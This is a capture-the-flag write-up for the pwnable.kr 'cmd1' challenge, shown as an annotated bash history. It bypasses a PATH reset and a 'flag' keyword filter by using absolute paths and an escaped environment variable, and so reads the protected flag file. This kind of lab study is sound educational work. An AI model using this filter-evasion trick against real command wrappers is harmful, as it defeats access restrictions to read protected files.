## pwnable.kr cmd1

Explaining the solution and approach I took by just printing out my `bash` history.

```
ssh cmd1@pwnable.kr -p2222 (pw:guest)

cmd1@ubuntu:~$ history
    1  ls
# Let's see what do we have here... okay got ourselves a c file.
    2  cat cmd1.c
    3  ls
# Looks like the c file just messes up your PATH env variable. 
# We can just avoid it by using absolute paths.
    4  ./cmd "/bin/cat /home/cmd1/flag"
    5  ./cmd1 "/bin/cat /home/cmd1/flag"
# Hmm. Why's it not working.
    6  ./cmd1 "/bin/cat /home/cmd1/$f"
    7  $f = flag; ./cmd1 "/bin/cat /home/cmd1/$f"
# Oh, because the binary also filters out the word 'flag'.
# Binaries inherit the environment of the shell. We can have a variable that just says 'flag'
# and use that variable instead.
    8  export $f = flag; ./cmd1 "/bin/cat /home/cmd1/$f"
    9  export f = flag; ./cmd1 "/bin/cat /home/cmd1/$f"
# Some fail attempts at setting an env variable
   10  export f=flag; ./cmd1 "/bin/cat /home/cmd1/$f"
   11  env
   12  export f=flag; ./cmd1 "/bin/echo $f"
# Okay that seriously should have worked. What the hell is the problem.
   13  /bin/echo
   14  /bin/echo $f
   15  export f=flag; ./cmd1 "/bin/echo \$f"
# Oh. The shell is expanding $f for us. We need to pass the literal string "$f".
# Gotta escape the $.
   19  export f=flag; ./cmd1 "/bin/cat /home/cmd1/\$f"
Got it. mommy now I get what PATH environment is for :)
   23  unset f
   24  env
   25  f=flag ./cmd1 "/bin/cat /home/cmd1/\$f"
   26  env
# Some testing. You can just pass a local env variable to programs you execute on the CLI,
# without having to mess up your env for any other programs started from that shell. No
# need to export.
```
